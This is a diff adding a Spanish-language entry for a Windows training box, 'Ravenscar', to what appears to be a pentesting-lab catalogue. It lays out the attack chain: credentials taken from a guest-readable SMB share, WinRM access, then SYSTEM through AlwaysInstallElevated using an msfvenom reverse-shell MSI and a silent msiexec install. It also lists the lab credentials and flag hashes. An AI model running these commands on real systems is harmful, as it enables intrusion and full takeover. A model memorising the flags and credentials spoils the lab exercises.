@@ -1152,6 +1152,70 @@ noise:
 
 ---
 
+## Box 16 — `Ravenscar`
+
+```
+id: 16
+name: Ravenscar
+os: windows
+difficulty: medium
+est_time: 40-60 min
+tags: [windows, workgroup, smb-guest, creds-in-share, winrm, alwaysinstallelevated, msi]
+
+target_ip: 10.10.14.145
+tun0_ip: 10.11.0.7
+
+services:
+  135/139/445: SMB (null denegado, guest lista)
+  3389: RDP
+  5985: WinRM
+
+surface:
+  - Workgroup (no dominio). guest lista shares -> share no estándar "Transfer".
+  - Transfer (guest READ) -> IT-handover.txt con creds de 'mason' para WinRM.
+
+chain:
+  - step: foothold-creds-in-share
+    trigger: share guest-readable con fichero de creds
+    technique: credenciales en SMB share -> WinRM
+    cheat_ref: [[14-servicios]] (SMB) · [[08-active-directory]]
+    aha: null denegado pero guest lista; un .txt con user:pass -> validar contra smb/winrm/rdp
+    expected_action: "smbclient //IP/Transfer -U guest% -> cat -> nxc winrm (Pwn3d!) -> evil-winrm"
+    hints: ["guest lista shares -> entra a 'Transfer'", "fichero con creds de mason", "nxc smb/winrm/rdp para validar dónde entra"]
+    resultado: WinRM como mason (usuario normal) -> user flag
+  - step: privesc-alwaysinstallelevated
+    trigger: whoami /priv pelado (mason NO es cuenta de servicio -> no Potato)
+    technique: AlwaysInstallElevated -> MSI como SYSTEM
+    cheat_ref: [[06-privesc-windows]] (AlwaysInstallElevated)
+    aha: token sin SeImpersonate -> misconfig; las 2 claves del registro a 0x1
+    expected_action: |
+      reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+      reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+      msfvenom -p windows/x64/shell_reverse_tcp LHOST=.. -f msi -o evil.msi
+      upload + msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
+    hints:
+      - "token pelado (no service account) -> no es Potato. Peina misconfigs: cmdkey, servicios, AlwaysInstallElevated. 06-privesc."
+      - "AlwaysInstallElevated: 2 claves de registro (HKLM+HKCU)."
+      - "ambas 0x1 -> msfvenom -f msi + msiexec /quiet /qn /i = SYSTEM."
+    resultado: SYSTEM
+
+creds:
+  - mason : Ravenscar@2024!   (IT-handover.txt en share Transfer; WinRM)
+
+flags:
+  user: 7e1a0c2f94d3b86501a7c9f62d0b4e38
+  root: b3d20c7a1a94e8650d1c2f7b9a4e0683
+
+noise:
+  - SMB null cerrado; solo guest lista.
+  - mason sin SeImpersonate -> NO potato (trampa: no todo Windows es SeImpersonate).
+  - AlwaysInstallElevated necesita las DOS claves a 1 (si solo una, no va).
+```
+
+**Lección pedagógica:** **creds en un share SMB guest** → validar contra smb/winrm/rdp → WinRM; y **privesc SIN privilegios de token**: `mason` no es cuenta de servicio (no Potato) → se peinan **misconfigs** → **AlwaysInstallElevated** (2 claves `0x1`) → `.msi` malicioso + `msiexec /quiet /qn /i` = SYSTEM. *No todo Windows es SeImpersonate.*
+
+---
+
 ## 📈 Ideas de evolución (roadmap del proyecto)
 
 - Añadir cajas Windows (SeImpersonate → PrintSpoofer/GodPotato) y AD (roasting → DCSync) con el mismo esquema.
